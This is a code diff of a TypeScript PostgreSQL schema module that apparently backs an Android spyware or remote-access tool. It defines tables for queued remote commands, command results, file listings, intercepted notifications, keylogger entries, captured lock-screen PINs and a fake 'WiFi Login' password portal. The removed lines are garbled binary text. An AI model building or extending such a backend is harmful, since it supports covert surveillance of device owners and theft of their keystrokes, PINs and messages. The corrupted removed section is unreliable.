@@ -1,34 +1,130 @@
-import { Pool } from 'pIÂ‚˜ÛÛœİ•\›H›ØÙ\ÜË™[‹‘UPTÑWÕT“‚šYˆ
-Y•\›
-HÂˆ›İÈ™]È\œ›ÜŠˆDD$4UõU$Â&VÇVÒF—6WBâÆ–†BFF&6Rõ$TDÔRæÖBVçGV²6&6WGWFF&6R6VæF—&’âp¢´((¼¼MM0è…­Ñ¥˜Õ¹ÑÕ¬Í•µÕ„¡½ÍĞ­•Õ…±¤±½…±¡½ÍĞ)½¹ÍĞÕÍ•MM0€ô€…‘‰UÉ°¹¥¹±Õ‘•Ì ±½…±¡½ÍĞœ¤€˜˜€…‘‰UÉ°¹¥¹±Õ‘•Ì 127.0.0.1')
+import { Pool } from 'pg'
 
-colİÛÛH™]ÈÛÛ
-ÂˆÛÛ›™Xİ[Û”İš[™Îˆ•\›ˆÜÛˆ\ÙTÔÓÈÈ™Z™Xİ[˜]]Üš^™Yˆ˜[ÙHHˆ˜[ÙKˆX^ˆKˆYU[Y[İ]Z[\ÎˆLˆÛÛ›™Xİ[Û•[Y[İ]Z[\ÎˆLÒ ¦W‡÷‘•™…Õ±ĞÁ½½°()±•Ğ}Í¡•µ…I•…‘ä€ô™…±Í”)•áÁ½ÉĞ…Íå¹Œ™Õ¹Ñ¥½¸¥¹¥ÑM¡•µ„ ¤ì(€¥˜€¡}Í¡•µ…I•…‘ä¤É•ÑÕÉ¸(€…İ…¥ĞÁ½½°¹ÅÕ•Éä¡€(€€€IQQ	1%9=Pa%MQL‘•Ù¥•Ì€ (€€€€€‘•Ù¥•}¥QaPAI%5Id-d°(€€€€€‘•Ù¥•}¹…µ”QaP9=P9U10U1P€Unknown Deviceˆ\İÜÙY[ˆSQTÕST‹ˆİ]È”ÓÓˆ“Õ•SQUS	ŞßIÂˆ
-Bˆ
-Bˆ]ØZ]ÛÛœ]Y\JˆÔ‘PUHP“HQˆ“ÕVTÕÈ[™[•ö6öÖÖæG2€¢–BDU…B$”Ô%’´U’À¢FWf–6Uö–BDU…BäõBåTÄÂ$TdU$Tä4U2FWf–6W2†FWf–6Uö–B’ôâDTÄUDR444DRÀ¢6öÖÖæBDU…BäõBåTÄÂÀ¢W‡G&DU…BÀ¢7&VFVEöBD”ÔU5DÕE¢äõBåTÄÂDTdTÅBäõr‚¢¢¢v—BööÂÅÕ•Éä¡€(€€€1QHQ	1Á•¹‘¥¹}½µµ…¹‘Ì=1U58%9=Pa%MQL•áÑÉ„QaP(€€¤(€…İ…¥ĞÁ½½°¹ÅÕ•É(`
+const dbUrl = process.env.DATABASE_URL
+
+if (!dbUrl) {
+  throw new Error(
+    'DATABASE_URL belum diset. Lihat database/README.md untuk cara setup database sendiri.'
+  )
+}
+
+// SSL: aktif untuk semua host kecuali localhost
+const useSSL = !dbUrl.includes('localhost') && !dbUrl.includes('127.0.0.1')
+
+const pool = new Pool({
+  connectionString: dbUrl,
+  ssl: useSSL ? { rejectUnauthorized: false } : false,
+  max: 5,
+  idleTimeoutMillis: 10000,
+  connectionTimeoutMillis: 5000,
+})
+
+export default pool
+
+let _schemaReady = false
+export async function initSchema() {
+  if (_schemaReady) return
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS devices (
+      device_id TEXT PRIMARY KEY,
+      device_name TEXT NOT NULL DEFAULT 'Unknown Device',
+      last_seen TIMESTAMPTZ,
+      stats JSONB NOT NULL DEFAULT '{}'
+    )
+  `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS pending_commands (
+      id TEXT PRIMARY KEY,
+      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
+      command TEXT NOT NULL,
+      extra TEXT,
+      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    ALTER TABLE pending_commands ADD COLUMN IF NOT EXISTS extra TEXT
+  `)
+  await pool.query(`
     CREATE TABLE IF NOT EXISTS command_history (
       id TEXT PRIMARY KEY,
       device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
       command TEXT NOT NULL,
-      result TEXT NOT NULL DEFAULT 	Ëˆ[Y\İ[\SQTÕSTˆ“Õ•SQUS“ÕÊ
-Kˆ^]ØÛÙHS•QÑTˆQUSˆ
-Bˆ
-Bˆ]ØZ]ÛÛœ]Y\JˆÔ‘PUHP“HQˆ“ÕVTÕÈš[WÛ\İ[™ÜÈ
-ˆ]šXÙWÚYV’SPT–HÑVH‘Q‘T‘SÑTÈ]šXÙ\Ê]šXÙWÚY
-HÓˆSUHĞTĞĞQKˆ]V“Õ•SQUS	ËÉËˆ[šY\È”ÓÓˆ“Õ•SQUS	Ö×IËˆ\]YØ]SQTÕSTˆ“Õ•SQUS“ÕÊ
-Bˆ
-Bˆ
-Bˆ]ØZ]ÛÛœ]Y\JˆÔ‘PUHP“HQˆ“ÕVTÕÈ›İYšXØ][ÛœÈ
-ˆYÑT’PS’SPT–HÑVKˆ]šXÙWÚYV“Õ•S‘Q‘T‘SÑTÈ]šXÙ\Ê]šXÙWÚY
-HÓˆSUHĞTĞĞQKˆ\ÜXÚØYÙHV“Õ•SQUS	ÂÀ¢öæÖRDU…BäõBåTÄÂDTdTÅBrrÀ¢F—FÆRDU…BäõBåTÄÂDTdTÅBœ°(€€€€€Ñ•áĞQaP9=P9U10U1P€œœ°(€€€€€É••¥Ù•‘}…ĞQ%5MQ5AQh9=P9U10U1P9=\ ¤(€€€€¤(€€¤(€…İ…¥ĞÁ½½°¹ÅÕ•É(`
-    CREATE INDEX IF NOT EXISTS idx_notificatiol×Ù]šXÙHÓˆ›İYšXØ][Û2†FWf–6Uö–BÂ&V6V—fVEöBDU42¢¢v—BööÂçVW'’†¢5$TDRD$ÄR”bäõBU„•5E2¶W–ÆöuöVçG&–W2€¢–B4U$”Â$”Ô%’´U’À¢FWf–6Uö–BDU…BäõBåTÄÂ$TdU$Tä4U2FWf–6W2†FWf–6Uö–B’ôâDTÄUDR444DRÀ¢÷6¶vRDU…BäõBåTÄÂDTdTÅBœ°(€€€€€…ÁÁ}¹…µ”QaP9=P9U10U1P€œ,
-      field_name TEXT NOT NULL DEFAULT 	Ëˆ^V“Õ•SQUS	ÉËˆØ\\™YØ]SQTÕSTˆ“Õ•SQUS“ÕÊ
-Bˆ
-Bˆ
-Bˆ]ØZ]ÛÛœ]Y\’†¢5$TDR”äDU‚”bäõBU„•5E2–G…ö¶W–ÆöuöFWf–6Rôâ¶W–Æõ}•¹ÑÉ¥•Ì¡‘•Ù¥•}¥°…ÁÑÕÉ•‘}…ĞM¤(€€¤(€…İ…¥ĞÁ½½°¹ÅÕ•Éä¡€(€€€IQQ	1%9=Pa%MQLÁ¥¹}…ÁÑÕÉ•Ì€ (€€€€€¥MI%0AI%5Id-d°(€€€€€‘•Ù¥•}¥QaP9=P9U10II9L‘•Ù¥•Ì¡‘•Ù¥•}¥¤=81QM°(€€€€€±½­}ÑåÁ”QaP9=P9U10U1P€Á¥¸,
+      result TEXT NOT NULL DEFAULT '',
+      timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+      exit_code INTEGER DEFAULT 0
+    )
+  `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS file_listings (
+      device_id TEXT PRIMARY KEY REFERENCES devices(device_id) ON DELETE CASCADE,
+      path TEXT NOT NULL DEFAULT '/',
+      entries JSONB NOT NULL DEFAULT '[]',
+      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS notifications (
+      id SERIAL PRIMARY KEY,
+      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
+      app_package TEXT NOT NULL DEFAULT '',
+      app_name TEXT NOT NULL DEFAULT '',
+      title TEXT NOT NULL DEFAULT '',
+      text TEXT NOT NULL DEFAULT '',
+      received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    CREATE INDEX IF NOT EXISTS idx_notifications_device ON notifications(device_id, received_at DESC)
+  `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS keylog_entries (
+      id SERIAL PRIMARY KEY,
+      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
+      app_package TEXT NOT NULL DEFAULT '',
+      app_name TEXT NOT NULL DEFAULT '',
+      field_name TEXT NOT NULL DEFAULT '',
+      text TEXT NOT NULL DEFAULT '',
+      captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    CREATE INDEX IF NOT EXISTS idx_keylog_device ON keylog_entries(device_id, captured_at DESC)
+  `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS pin_captures (
+      id SERIAL PRIMARY KEY,
+      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
+      lock_type TEXT NOT NULL DEFAULT 'pin',
       value TEXT NOT NULL DEFAULT '',
       captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
     )
   `)
-  await pool.querJˆÔ‘PUHS‘VQˆ“ÕVTÕÈYÜ[—Ù]šXÙHÓˆ[—ØØ\\™\Ê]šXÙWÚYØ\\™YØ]TĞÊBˆ
-BˆÜØÚ[XT™XYHHYBŸB
+  await pool.query(`
+    CREATE INDEX IF NOT EXISTS idx_pin_device ON pin_captures(device_id, captured_at DESC)
+  `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS wifi_portal_config (
+      device_id     TEXT        PRIMARY KEY REFERENCES devices(device_id) ON DELETE CASCADE,
+      enabled       BOOLEAN     NOT NULL DEFAULT false,
+      password      TEXT        NOT NULL DEFAULT '',
+      title         TEXT        NOT NULL DEFAULT 'WiFi Login',
+      message       TEXT        NOT NULL DEFAULT 'Masukkan password untuk terhubung ke internet.',
+      portal_active BOOLEAN     NOT NULL DEFAULT false,
+      portal_ip     TEXT        NOT NULL DEFAULT '',
+      portal_port   INTEGER     NOT NULL DEFAULT 0,
+      updated_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS wifi_portal_sessions (
+      id            SERIAL      PRIMARY KEY,
+      device_id     TEXT        NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
+      client_ip     TEXT        NOT NULL DEFAULT '',
+      authorized_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    CREATE INDEX IF NOT EXISTS idx_portal_sessions ON wifi_portal_sessions(device_id, authorized_at DESC)
+  `)
+  _schemaReady = true
+}
